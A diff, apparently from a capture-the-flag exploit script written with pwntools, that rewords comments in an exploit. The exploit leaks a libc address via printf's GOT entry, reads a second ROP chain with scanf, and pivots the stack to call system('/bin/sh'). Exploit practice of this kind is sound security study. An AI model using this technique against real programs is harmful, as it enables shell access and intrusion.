@@ -17,7 +17,8 @@ def pr(x):
     p.sendline(str(x))
 
 def num(x, y):
-    #generate sequences of length 9 that correspondes to powers of 0x80 to make a base 0x80 number
+    #generate sequences of length 9 that correspondes to powers of 0x80
+    #add one more value to each sequence that signifies the digit base 0x80 to create numbers
     for i in reversed(range(10)):
         for j in range(i):
             for l in range(0x80):
@@ -59,7 +60,7 @@ w = n
 num(off3, (1 << 64) + 0x8 * (off2 - n - 7))
 pr(n)
 
-#make rop chain to leak libc, write system adr and '/bin/sh', and pivot stack to call system('/bin/sh')
+#make rop chain to leak libc, scanf second rop chain, then pivot stack to second rop chain
 
 rop = ROP(e)
 rop.printf(arr + 0x4 * (n - 1), printf_got)
@@ -109,7 +110,7 @@ libc_off = u64(p.recv(6).ljust(8, b'\x00')) - printf_off
 
 log.info('Libc off adr: ' + hex(libc_off))
 
-#write system('/bin/sh')
+#input rop to system('/bin/sh')
 
 libc.address = libc_off
 rop = ROP(libc, arr + 0x1000)
